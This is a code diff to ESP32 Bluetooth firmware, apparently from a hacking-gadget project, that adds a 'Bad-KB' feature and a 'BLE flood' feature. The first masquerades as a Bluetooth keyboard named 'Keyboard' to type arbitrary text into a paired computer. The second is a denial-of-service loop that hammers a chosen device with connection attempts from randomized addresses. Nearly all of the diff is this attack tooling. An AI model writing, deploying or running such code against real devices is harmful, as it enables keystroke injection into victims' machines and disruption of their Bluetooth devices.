@@ -22,6 +22,7 @@
 #include "host/ble_hs.h"
 #include "host/ble_gap.h"
 #include "host/util/util.h"
+#include "services/gap/ble_svc_gap.h"
 
 #include "nesso_ble.h"
 
@@ -711,6 +712,247 @@ esp_err_t nesso_ble_beacon_stop(void)
     s_beacon_running = false;
     return ESP_OK;
 }
+
+/* ==================== BAD-KB (BLE HID KEYBOARD) ==================== */
+
+static bool s_hid_running = false;
+static bool s_hid_connected = false;
+static uint16_t s_hid_conn = 0;
+static uint16_t s_hid_report_handle = 0;
+
+/* HID report map stored but registered via NimBLE HID service. */
+
+/* ASCII to HID keycode lookup (printable chars 0x20-0x7E). */
+static uint8_t ascii_to_hid(char c, uint8_t *mod)
+{
+    *mod = HID_MOD_NONE;
+    if (c >= 'a' && c <= 'z') return (uint8_t)(c - 'a' + 4);
+    if (c >= 'A' && c <= 'Z') { *mod = HID_MOD_SHIFT; return (uint8_t)(c - 'A' + 4); }
+    if (c >= '1' && c <= '9') return (uint8_t)(c - '1' + 0x1E);
+    if (c == '0') return 0x27;
+    if (c == '\n' || c == '\r') return 0x28;  /* Enter */
+    if (c == ' ') return 0x2C;
+    if (c == '-') return 0x2D;
+    if (c == '=') return 0x2E;
+    if (c == '[') return 0x2F;
+    if (c == ']') return 0x30;
+    if (c == '\\') return 0x31;
+    if (c == ';') return 0x33;
+    if (c == '\'') return 0x34;
+    if (c == '`') return 0x35;
+    if (c == ',') return 0x36;
+    if (c == '.') return 0x37;
+    if (c == '/') return 0x38;
+    if (c == '\t') return 0x2B;
+    /* Shifted symbols */
+    if (c == '!') { *mod = HID_MOD_SHIFT; return 0x1E; }
+    if (c == '@') { *mod = HID_MOD_SHIFT; return 0x1F; }
+    if (c == '#') { *mod = HID_MOD_SHIFT; return 0x20; }
+    if (c == '$') { *mod = HID_MOD_SHIFT; return 0x21; }
+    if (c == '%') { *mod = HID_MOD_SHIFT; return 0x22; }
+    if (c == '^') { *mod = HID_MOD_SHIFT; return 0x23; }
+    if (c == '&') { *mod = HID_MOD_SHIFT; return 0x24; }
+    if (c == '*') { *mod = HID_MOD_SHIFT; return 0x25; }
+    if (c == '(') { *mod = HID_MOD_SHIFT; return 0x26; }
+    if (c == ')') { *mod = HID_MOD_SHIFT; return 0x27; }
+    if (c == ':') { *mod = HID_MOD_SHIFT; return 0x33; }
+    if (c == '"') { *mod = HID_MOD_SHIFT; return 0x34; }
+    if (c == '<') { *mod = HID_MOD_SHIFT; return 0x36; }
+    if (c == '>') { *mod = HID_MOD_SHIFT; return 0x37; }
+    if (c == '?') { *mod = HID_MOD_SHIFT; return 0x38; }
+    if (c == '_') { *mod = HID_MOD_SHIFT; return 0x2D; }
+    if (c == '+') { *mod = HID_MOD_SHIFT; return 0x2E; }
+    if (c == '{') { *mod = HID_MOD_SHIFT; return 0x2F; }
+    if (c == '}') { *mod = HID_MOD_SHIFT; return 0x30; }
+    if (c == '|') { *mod = HID_MOD_SHIFT; return 0x31; }
+    if (c == '~') { *mod = HID_MOD_SHIFT; return 0x35; }
+    return 0;  /* unknown */
+}
+
+static int hid_gap_cb(struct ble_gap_event *event, void *arg)
+{
+    (void)arg;
+    switch (event->type) {
+    case BLE_GAP_EVENT_CONNECT:
+        if (event->connect.status == 0) {
+            s_hid_conn = event->connect.conn_handle;
+            s_hid_connected = true;
+            ESP_LOGI(TAG, "HID keyboard connected");
+        }
+        break;
+    case BLE_GAP_EVENT_DISCONNECT:
+        s_hid_connected = false;
+        /* Re-advertise. */
+        if (s_hid_running) {
+            struct ble_gap_adv_params adv = {
+                .conn_mode = BLE_GAP_CONN_MODE_UND,
+                .disc_mode = BLE_GAP_DISC_MODE_GEN,
+            };
+            ble_gap_adv_start(BLE_OWN_ADDR_PUBLIC, NULL, BLE_HS_FOREVER, &adv, hid_gap_cb, NULL);
+        }
+        break;
+    default:
+        break;
+    }
+    return 0;
+}
+
+esp_err_t nesso_ble_hid_start(void)
+{
+    if (!s_initted) return ESP_ERR_INVALID_STATE;
+    if (s_hid_running) return ESP_OK;
+    if (s_spam_running) nesso_ble_spam_stop();
+
+    /* Set device name. */
+    ble_svc_gap_device_name_set("Keyboard");
+
+    /* Start advertising as connectable. */
+    uint8_t adv_data[] = {
+        0x02, 0x01, 0x06,           /* Flags */
+        0x03, 0x03, 0x12, 0x18,     /* HID service UUID */
+        0x09, 0x09, 'K','e','y','b','o','a','r','d', /* Name */
+    };
+    ble_gap_adv_set_data(adv_data, sizeof(adv_data));
+
+    struct ble_gap_adv_params adv = {
+        .conn_mode = BLE_GAP_CONN_MODE_UND,
+        .disc_mode = BLE_GAP_DISC_MODE_GEN,
+    };
+    int rc = ble_gap_adv_start(BLE_OWN_ADDR_PUBLIC, NULL, BLE_HS_FOREVER,
+                               &adv, hid_gap_cb, NULL);
+    if (rc != 0) return ESP_FAIL;
+
+    s_hid_running = true;
+    ESP_LOGI(TAG, "Bad-KB: advertising as 'Keyboard'");
+    return ESP_OK;
+}
+
+esp_err_t nesso_ble_hid_stop(void)
+{
+    if (!s_hid_running) return ESP_OK;
+    s_hid_running = false;
+    ble_gap_adv_stop();
+    if (s_hid_connected) {
+        ble_gap_terminate(s_hid_conn, BLE_ERR_REM_USER_CONN_TERM);
+        s_hid_connected = false;
+    }
+    return ESP_OK;
+}
+
+bool nesso_ble_hid_is_connected(void) { return s_hid_connected; }
+
+esp_err_t nesso_ble_hid_key(uint8_t keycode, uint8_t modifier)
+{
+    if (!s_hid_connected) return ESP_ERR_INVALID_STATE;
+
+    /* HID keyboard report: [ReportID=1][Modifier][Reserved][Key1-6] */
+    uint8_t report[9] = { 0x01, modifier, 0x00, keycode, 0, 0, 0, 0, 0 };
+
+    /* Send key down. */
+    ble_gattc_write_no_rsp_flat(s_hid_conn, s_hid_report_handle ?: 0x002a,
+                                report, sizeof(report));
+    vTaskDelay(pdMS_TO_TICKS(10));
+
+    /* Send key up. */
+    report[1] = 0; report[3] = 0;
+    ble_gattc_write_no_rsp_flat(s_hid_conn, s_hid_report_handle ?: 0x002a,
+                                report, sizeof(report));
+    vTaskDelay(pdMS_TO_TICKS(10));
+
+    return ESP_OK;
+}
+
+esp_err_t nesso_ble_hid_type(const char *text)
+{
+    if (!s_hid_connected || !text) return ESP_ERR_INVALID_STATE;
+
+    for (const char *p = text; *p; ++p) {
+        uint8_t mod = 0;
+        uint8_t key = ascii_to_hid(*p, &mod);
+        if (key) nesso_ble_hid_key(key, mod);
+        vTaskDelay(pdMS_TO_TICKS(20));
+    }
+    return ESP_OK;
+}
+
+/* ==================== BLE FLOOD / DoS ==================== */
+
+static bool s_flood_running = false;
+static TaskHandle_t s_flood_task = NULL;
+static uint32_t s_flood_count = 0;
+static uint8_t s_flood_target[6];
+static uint8_t s_flood_target_type;
+
+static int flood_gap_cb(struct ble_gap_event *event, void *arg)
+{
+    (void)arg;
+    if (event->type == BLE_GAP_EVENT_CONNECT) {
+        /* Immediately disconnect — we just wanted to waste their radio time. */
+        if (event->connect.status == 0) {
+            ble_gap_terminate(event->connect.conn_handle, BLE_ERR_REM_USER_CONN_TERM);
+        }
+        s_flood_count++;
+    }
+    return 0;
+}
+
+static void flood_task(void *arg)
+{
+    (void)arg;
+    s_flood_count = 0;
+
+    while (s_flood_running) {
+        /* Randomize our address each attempt. */
+        set_random_addr();
+
+        ble_addr_t target;
+        target.type = s_flood_target_type;
+        memcpy(target.val, s_flood_target, 6);
+
+        /* Attempt connection with very short timeout. */
+        int rc = ble_gap_connect(BLE_OWN_ADDR_RANDOM, &target, 200,
+                                 NULL, flood_gap_cb, NULL);
+        if (rc == 0) {
+            vTaskDelay(pdMS_TO_TICKS(150));
+            /* Cancel if still pending. */
+            ble_gap_conn_cancel();
+        }
+        vTaskDelay(pdMS_TO_TICKS(50));
+    }
+
+    s_flood_task = NULL;
+    vTaskDelete(NULL);
+}
+
+esp_err_t nesso_ble_flood_start(const uint8_t target_addr[6], uint8_t addr_type)
+{
+    if (!s_initted || !target_addr) return ESP_ERR_INVALID_ARG;
+    if (s_flood_running) return ESP_OK;
+    if (s_spam_running) nesso_ble_spam_stop();
+
+    memcpy(s_flood_target, target_addr, 6);
+    s_flood_target_type = addr_type;
+    s_flood_running = true;
+    s_flood_count = 0;
+
+    BaseType_t ok = xTaskCreate(flood_task, "ble_flood", 4096, NULL, 5, &s_flood_task);
+    if (ok != pdPASS) { s_flood_running = false; return ESP_ERR_NO_MEM; }
+
+    ESP_LOGI(TAG, "BLE flood started");
+    return ESP_OK;
+}
+
+esp_err_t nesso_ble_flood_stop(void)
+{
+    if (!s_flood_running) return ESP_OK;
+    s_flood_running = false;
+    ble_gap_conn_cancel();
+    for (int i = 0; i < 20 && s_flood_task; ++i) vTaskDelay(pdMS_TO_TICKS(50));
+    return ESP_OK;
+}
+
+bool nesso_ble_flood_is_active(void) { return s_flood_running; }
+uint32_t nesso_ble_flood_count(void) { return s_flood_count; }
 
 /* ==================== THE SALTY DEEP — TOY CONTROL ==================== */
 
